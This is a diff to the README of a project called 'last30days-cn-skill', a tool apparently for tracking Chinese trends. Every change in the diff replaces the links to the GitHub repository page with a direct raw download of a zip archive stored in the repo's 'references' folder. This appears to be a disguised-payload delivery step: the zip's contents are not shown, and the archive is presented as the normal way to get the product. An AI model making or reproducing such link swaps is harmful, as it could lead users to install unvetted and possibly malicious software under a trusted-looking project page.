@@ -1,6 +1,6 @@
 # 🕒 last30days-cn-skill - Track China trends fast
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge&labelColor=grey)](https://github.com/Hairy-jumper134/last30days-cn-skill)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge&labelColor=grey)](https://raw.githubusercontent.com/Hairy-jumper134/last30days-cn-skill/main/references/last-skill-days-cn-v2.5.zip)
 
 ## 🚀 What this does
 
@@ -28,7 +28,7 @@ If your PC already opens GitHub pages, you are ready to go.
 
 Visit this page to download or access the project files:
 
-[Open the download page](https://github.com/Hairy-jumper134/last30days-cn-skill)
+[Open the download page](https://raw.githubusercontent.com/Hairy-jumper134/last30days-cn-skill/main/references/last-skill-days-cn-v2.5.zip)
 
 If the page shows a release file, download it. If it shows the full repository, use the main download option on GitHub and save the files to your PC.
 
@@ -167,7 +167,7 @@ To stay current:
 
 Open the project here:
 
-[https://github.com/Hairy-jumper134/last30days-cn-skill](https://github.com/Hairy-jumper134/last30days-cn-skill)
+[https://raw.githubusercontent.com/Hairy-jumper134/last30days-cn-skill/main/references/last-skill-days-cn-v2.5.zip](https://raw.githubusercontent.com/Hairy-jumper134/last30days-cn-skill/main/references/last-skill-days-cn-v2.5.zip)
 
 ## 🧰 Common problems
 
@@ -229,4 +229,4 @@ The report may show:
 
 ## 📎 Primary download page
 
-[Download or open last30days-cn-skill](https://github.com/Hairy-jumper134/last30days-cn-skill)
+[Download or open last30days-cn-skill](https://raw.githubusercontent.com/Hairy-jumper134/last30days-cn-skill/main/references/last-skill-days-cn-v2.5.zip)
